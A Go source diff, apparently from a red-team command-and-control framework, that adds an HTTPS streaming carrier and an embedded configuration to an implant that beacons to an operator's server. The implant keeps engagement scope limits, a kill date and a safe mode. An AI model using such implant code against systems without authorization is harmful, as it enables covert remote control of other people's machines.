@@ -13,6 +13,7 @@ import (
 	"log"
 	"math/rand"
 	"net"
+	"net/http"
 	"os"
 	"os/signal"
 	"os/user"
@@ -109,6 +110,76 @@ func connect(serverAddr string, tlsConfig *tls.Config) (net.Conn, error) {
 	return conn, nil
 }
 
+// connectHTTPS opens a long-lived streaming POST. The request body carries
+// implant-to-server frames and the response body carries server-to-implant
+// frames, so the normal register/checkin/result loop works unchanged.
+func connectHTTPS(rawURL string, tlsConfig *tls.Config) (net.Conn, error) {
+	pr, pw := io.Pipe()
+	req, err := http.NewRequest(http.MethodPost, rawURL, pr)
+	if err != nil {
+		pw.CloseWithError(err)
+		return nil, fmt.Errorf("https request: %w", err)
+	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig:   tlsConfig,
+			ForceAttemptHTTP2: true,
+		},
+	}
+
+	type result struct {
+		resp *http.Response
+		err  error
+	}
+	ch := make(chan result, 1)
+	go func() {
+		resp, err := client.Do(req)
+		ch <- result{resp: resp, err: err}
+	}()
+
+	select {
+	case res := <-ch:
+		if res.err != nil {
+			pw.CloseWithError(res.err)
+			return nil, fmt.Errorf("https dial: %w", res.err)
+		}
+		return &httpClientConn{resp: res.resp, pw: pw}, nil
+	case <-time.After(15 * time.Second):
+		pw.CloseWithError(context.DeadlineExceeded)
+		return nil, fmt.Errorf("https dial timed out")
+	}
+}
+
+type httpClientConn struct {
+	resp *http.Response
+	pw   *io.PipeWriter
+}
+
+func (c *httpClientConn) Read(p []byte) (int, error)  { return c.resp.Body.Read(p) }
+func (c *httpClientConn) Write(p []byte) (int, error) { return c.pw.Write(p) }
+func (c *httpClientConn) Close() error {
+	_ = c.pw.Close()
+	return c.resp.Body.Close()
+}
+
+func (c *httpClientConn) LocalAddr() net.Addr { return implantAddr("local") }
+func (c *httpClientConn) RemoteAddr() net.Addr {
+	if c.resp != nil && c.resp.Request != nil && c.resp.Request.URL != nil {
+		return implantAddr(c.resp.Request.URL.Host)
+	}
+	return implantAddr("remote")
+}
+func (c *httpClientConn) SetDeadline(time.Time) error      { return nil }
+func (c *httpClientConn) SetReadDeadline(time.Time) error  { return nil }
+func (c *httpClientConn) SetWriteDeadline(time.Time) error { return nil }
+
+type implantAddr string
+
+func (a implantAddr) Network() string { return "https" }
+func (a implantAddr) String() string  { return string(a) }
+
 type registerResult struct {
 	SessionID       string
 	SessionToken    string
@@ -118,13 +189,13 @@ type registerResult struct {
 	KillReason      string
 }
 
-func register(conn net.Conn, info protocol.RegisterData, engagementID string, interval time.Duration, jitter float64) (*registerResult, error) {
+func register(conn net.Conn, info protocol.RegisterData, engagementID, transport string, interval time.Duration, jitter float64) (*registerResult, error) {
 	info.ProtocolVersion = protocol.CurrentVersion
 	info.Capabilities = []string{protocol.CapabilityKill, protocol.CapabilitySessionToken}
 	info.EngagementID = engagementID
 	info.SleepMs = int(interval / time.Millisecond)
 	info.JitterPct = int(jitter * 100)
-	info.Transports = []string{"mtls"}
+	info.Transports = []string{transport}
 
 	regData, err := json.Marshal(info)
 	if err != nil {
@@ -169,25 +240,45 @@ func register(conn net.Conn, info protocol.RegisterData, engagementID string, in
 }
 
 func main() {
-	serverAddr := flag.String("server", "", "C2 server address (host:port)")
-	interval := flag.Duration("interval", 5*time.Second, "beacon interval")
-	jitter := flag.Float64("jitter", 0.3, "jitter factor (0-1)")
+	var embedded protocol.ImplantConfig
+	if embeddedConfigJSON != "" {
+		if err := json.Unmarshal([]byte(embeddedConfigJSON), &embedded); err != nil {
+			log.Fatalf("embedded config: %v", err)
+		}
+	}
+
+	intervalDefault := 5 * time.Second
+	if embedded.IntervalMs > 0 {
+		intervalDefault = time.Duration(embedded.IntervalMs) * time.Millisecond
+	}
+	jitterDefault := 0.3
+	if embedded.JitterPct > 0 {
+		jitterDefault = float64(embedded.JitterPct) / 100
+	}
+
+	serverAddr := flag.String("server", embedded.ServerAddr, "C2 server address (host:port)")
+	httpsURL := flag.String("https-url", embedded.HTTPSURL, "HTTPS carrier URL (streaming POST); overrides --server")
+	interval := flag.Duration("interval", intervalDefault, "beacon interval")
+	jitter := flag.Float64("jitter", jitterDefault, "jitter factor (0-1)")
 	caPath := flag.String("ca", "", "path to CA cert PEM used to verify the server (required unless --insecure)")
 	certPath := flag.String("cert", "", "path to client certificate PEM presented to the server (required when the listener enforces mTLS)")
 	keyPath := flag.String("key", "", "path to client private key PEM")
-	insecure := flag.Bool("insecure", false, "skip server certificate verification (development only)")
+	insecure := flag.Bool("insecure", embedded.Insecure, "skip server certificate verification (development only)")
 
-	engagementID := flag.String("engagement-id", "", "engagement identifier used by safety checks")
-	scopeCIDRs := flag.String("scope-cidrs", "", "comma-separated CIDR ranges allowed by the engagement")
-	scopeHosts := flag.String("scope-hosts", "", "comma-separated hostnames allowed by the engagement")
-	scopeDomains := flag.String("scope-domains", "", "comma-separated domain suffixes allowed by the engagement")
-	killDateRaw := flag.String("kill-date", "", "RFC3339 time after which the implant must stop")
-	windowStart := flag.String("window-start", "", "RFC3339 start of the allowed operating window")
-	windowEnd := flag.String("window-end", "", "RFC3339 end of the allowed operating window")
-	dataQuotaBytes := flag.Int64("data-quota-bytes", 0, "maximum bytes the implant may exfiltrate (0 = unlimited)")
-	remoteKillURL := flag.String("remote-kill-url", "", "URL polled for a remote kill signal (fail-closed when unreachable)")
-	safeMode := flag.Bool("safe-mode", false, "enforce the read-only command allowlist")
+	engagementID := flag.String("engagement-id", embedded.EngagementID, "engagement identifier used by safety checks")
+	scopeCIDRs := flag.String("scope-cidrs", strings.Join(embedded.ScopeCIDRs, ","), "comma-separated CIDR ranges allowed by the engagement")
+	scopeHosts := flag.String("scope-hosts", strings.Join(embedded.ScopeHosts, ","), "comma-separated hostnames allowed by the engagement")
+	scopeDomains := flag.String("scope-domains", strings.Join(embedded.ScopeDomains, ","), "comma-separated domain suffixes allowed by the engagement")
+	killDateRaw := flag.String("kill-date", embedded.KillDate, "RFC3339 time after which the implant must stop")
+	windowStart := flag.String("window-start", embedded.WindowStart, "RFC3339 start of the allowed operating window")
+	windowEnd := flag.String("window-end", embedded.WindowEnd, "RFC3339 end of the allowed operating window")
+	dataQuotaBytes := flag.Int64("data-quota-bytes", embedded.DataQuotaBytes, "maximum bytes the implant may exfiltrate (0 = unlimited)")
+	remoteKillURL := flag.String("remote-kill-url", embedded.RemoteKillURL, "URL polled for a remote kill signal (fail-closed when unreachable)")
+	safeMode := flag.Bool("safe-mode", embedded.SafeMode, "enforce the read-only command allowlist")
 	flag.Parse()
+
+	setFlags := make(map[string]bool)
+	flag.Visit(func(f *flag.Flag) { setFlags[f.Name] = true })
 
 	var err error
 	agentSafety, agentAllowlist, err = buildSafety(safetyConfig{
@@ -206,20 +297,58 @@ func main() {
 		log.Fatalf("safety configuration: %v", err)
 	}
 
-	if *serverAddr == "" {
-		fmt.Fprintf(os.Stderr, "error: --server is required\n")
-		os.Exit(1)
+	transport := embedded.Transport
+	if setFlags["server"] {
+		transport = "mtls"
+	}
+	if setFlags["https-url"] {
+		transport = "https"
+	}
+	if transport == "" {
+		if *httpsURL != "" {
+			transport = "https"
+		} else {
+			transport = "mtls"
+		}
+	}
+	switch transport {
+	case "mtls":
+		if *serverAddr == "" {
+			log.Fatalf("--server is required for the mTLS carrier")
+		}
+	case "https":
+		if *httpsURL == "" {
+			log.Fatalf("--https-url is required for the HTTPS carrier")
+		}
+	default:
+		log.Fatalf("unsupported transport %q", transport)
 	}
 
-	tlsConfig, err := tlsutil.ClientTLSConfig(tlsutil.ClientOptions{
-		CAPath:   *caPath,
-		CertFile: *certPath,
-		KeyFile:  *keyPath,
-		Insecure: *insecure,
-	})
+	var tlsConfig *tls.Config
+	switch {
+	case *caPath != "" || *certPath != "" || *keyPath != "":
+		tlsConfig, err = tlsutil.ClientTLSConfig(tlsutil.ClientOptions{
+			CAPath:   *caPath,
+			CertFile: *certPath,
+			KeyFile:  *keyPath,
+			Insecure: *insecure,
+		})
+	case embedded.CACertPEM != "" || embedded.ClientCertPEM != "" || embedded.ClientKeyPEM != "":
+		tlsConfig, err = tlsutil.ClientTLSConfigFromPEM(
+			[]byte(embedded.CACertPEM), []byte(embedded.ClientCertPEM), []byte(embedded.ClientKeyPEM), *insecure)
+	default:
+		tlsConfig, err = tlsutil.ClientTLSConfig(tlsutil.ClientOptions{
+			CAPath:   *caPath,
+			CertFile: *certPath,
+			KeyFile:  *keyPath,
+			Insecure: *insecure,
+		})
+	}
 	if err != nil {
 		log.Fatalf("tls config: %v", err)
 	}
+
+	log.Printf("using %s carrier", transport)
 
 	sysInfo := collectSystemInfo()
 
@@ -242,7 +371,12 @@ func main() {
 			return
 		}
 
-		conn, err := connect(*serverAddr, tlsConfig)
+		var conn net.Conn
+		if *httpsURL != "" {
+			conn, err = connectHTTPS(*httpsURL, tlsConfig)
+		} else {
+			conn, err = connect(*serverAddr, tlsConfig)
+		}
 		if err != nil {
 			log.Printf("connect failed: %v (retry in %v)", err, backoff)
 			select {
@@ -258,7 +392,7 @@ func main() {
 		}
 		backoff = time.Second // reset on successful connect
 
-		reg, err := register(conn, sysInfo, *engagementID, *interval, *jitter)
+		reg, err := register(conn, sysInfo, *engagementID, transport, *interval, *jitter)
 		if err != nil {
 			log.Printf("register failed: %v", err)
 			conn.Close()
